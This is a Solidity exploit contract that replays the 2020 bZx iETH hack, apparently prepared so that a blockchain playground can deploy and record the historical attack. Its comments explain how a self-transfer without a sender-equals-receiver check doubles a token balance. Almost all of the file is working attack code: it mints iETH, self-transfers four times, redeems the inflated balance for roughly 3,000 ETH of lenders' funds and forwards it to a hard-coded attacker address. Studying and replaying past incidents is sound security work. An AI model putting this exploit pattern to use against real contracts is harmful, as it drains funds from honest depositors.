// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2020-09-bzx).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `bzx` test contract
// (which inherits Test and uses vm.deal cheatcodes), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack (testExploit body), so the playground can deploy it and record
// testExploit(). Logic and constants are copied verbatim from test/bzx_exp.sol.
// Plain Solidity: no Test, no cheats, no setUp. Entry is testExploit + receive callback.
//
// Root cause: bZx's interest-bearing token (iETH) inherits an ERC20
// `_internalTransferFrom` that caches BOTH the sender's and receiver's balances
// into locals, then writes them back sequentially. There is NO `_from != _to`
// guard, so a self-transfer doubles the holder's balance (write #2 overwrites
// write #1 using the pre-debit snapshot) while `totalSupply` is untouched. The
// attacker mints 200 ETH of iETH, self-transfers it to itself 4x to inflate the
// balance ~16x, then burns the inflated iETH at the honest token price for
// ~3,200 ETH — netting ~3,000 ETH drained from honest lenders' WETH.

interface ILoanTokenLogicWeth {
    function mintWithEther(address receiver) external payable returns (uint256 mintAmount);
    function burnToEther(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _who) external view returns (uint256);
}

contract BzxSelfTransfer {
    // The attacker EOA — profit (the inflated ETH) is forwarded here at the end.
    address payable constant ATTACKER = payable(0xd1c0f1316140D6bF1a9e2Eea8a227dAD151F69b7);
    // LoanToken (iETH) proxy — calls delegatecall into the buggy logic.
    ILoanTokenLogicWeth constant LOAN_TOKEN =
        ILoanTokenLogicWeth(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);

    /// @notice The recorded entrypoint. The 200 ETH seed capital (standing in
    ///         for the test's `vm.deal(this, 200 ether)` flash loan) is sent to
    ///         this contract in the unrecorded setup phase, so testExploit() takes no
    ///         value and reads its balance directly. All ETH the attack produces
    ///         above the 200 ETH seed is forwarded to ATTACKER as profit.
    function testExploit() external {
        require(address(this).balance >= 200 ether, "need 200 ETH seed");

        // 1) Mint iETH: wrap the 200 ETH into WETH and credit iETH at ~1.004x.
        LOAN_TOKEN.mintWithEther{value: 200 ether}(address(this));

        // 2) Self-transfer the full balance to itself 4 times. Each call hits the
        //    buggy `_internalTransferFrom` with `_from == _to`, so the cached
        //    receiver snapshot overwrites the debit and the balance DOUBLES:
        //    199 -> 398 -> 797 -> 1,593 -> ~3,186 iETH. totalSupply is unchanged.
        for (uint256 i = 0; i < 4; i++) {
            uint256 bal = LOAN_TOKEN.balanceOf(address(this));
            LOAN_TOKEN.transfer(address(this), bal);
        }

        // 3) Burn the inflated iETH at the honest token price (~1.004 ETH/iETH).
        //    burnToEther redeems the underlying WETH to ETH and sends it here.
        uint256 burnBal = LOAN_TOKEN.balanceOf(address(this));
        LOAN_TOKEN.burnToEther(address(this), burnBal);

        // 4) Forward the entire ETH balance (the 200 ETH seed + ~3,000 ETH profit)
        //    to the attacker EOA. The recorder baselines the attacker's native
        //    balance after the setup fund, so only the ~3,000 ETH counts as profit.
        ATTACKER.transfer(address(this).balance);
    }

    // iETH mint/burn pull ETH through this contract; accept them.
    receive() external payable {}
}
